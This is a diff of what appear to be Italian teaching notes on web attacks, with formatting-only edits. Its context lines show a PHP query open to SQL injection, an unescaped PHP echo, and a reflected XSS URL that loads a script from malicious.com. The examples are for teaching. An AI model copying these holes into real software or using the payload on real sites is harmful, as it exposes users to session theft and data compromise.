@@ -36,7 +36,7 @@ Fare il controllo dell'input non fidato.
 
 ### SQL injection
 ```php
-$query= "SELECT role FROM user WHERE name='$name' AND password='$pwd'"; 
+$query = "SELECT role FROM user WHERE name='$name' AND password='$pwd'"; 
 ```
 
 #### SQL injection (Exploit 1)
@@ -71,9 +71,9 @@ Questo attacco si dice non persistente in quanto non inietta permanentemente lo 
 ```php
 <h1>Ciao, <?php echo $_GET['nome_utente']; ?></h1>
 ```
-```
+
 https://example.com/welcome.php?nome_utente=%3Cscript%20src=%22http://malicious.com/evil.js%22%3E%3C/script%3E"
-```
+
 ```html
 <h1>Ciao, <script src="http://malicious.com/evil.js"></script></h1>
 ```
